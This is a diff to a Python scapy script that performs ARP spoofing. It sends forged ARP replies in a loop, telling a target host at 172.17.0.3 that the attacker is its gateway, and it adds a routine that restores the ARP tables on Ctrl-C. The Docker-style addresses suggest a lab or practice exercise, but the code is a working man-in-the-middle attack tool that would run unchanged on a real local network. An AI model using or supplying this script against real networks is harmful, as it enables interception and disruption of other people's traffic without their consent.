@@ -4,6 +4,10 @@ import scapy.all as scapy
 import time
 import sys
 
+sent_packet_count = 0
+target_ip = '172.17.0.3'
+gateway_ip = '172.17.0.1'
+
 
 def get_arp_request(target_ip):
     return scapy.ARP(pdst=target_ip)
@@ -26,19 +30,26 @@ def get_mac(target_ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip,
-                       hwdst='02:42:ac:11:00:03', psrc=spoof_ip)
+                       hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
 
-sent_packet_count = 0
+def restore_mac(dest_ip, source_ip):
+    dest_mac = get_mac(dest_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
+                       psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
 
 try:
     while True:
-        spoof('172.17.0.3', '172.17.0.1')
-        spoof('172.17.0.3', '172.17.0.1')
+        spoof(target_ip, gateway_ip)
+        spoof(target_ip, gateway_ip)
         sent_packet_count = sent_packet_count + 2
         print('\r[+] Packets sent: ' + str(sent_packet_count), end='')
         sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
-    print('[+] Detected Ctrl-c. Quitting.')
+    print('[+] Detected Ctrl-c. Reseting ARP tables; please wait.')
+    restore_mac(target_ip, gateway_ip)
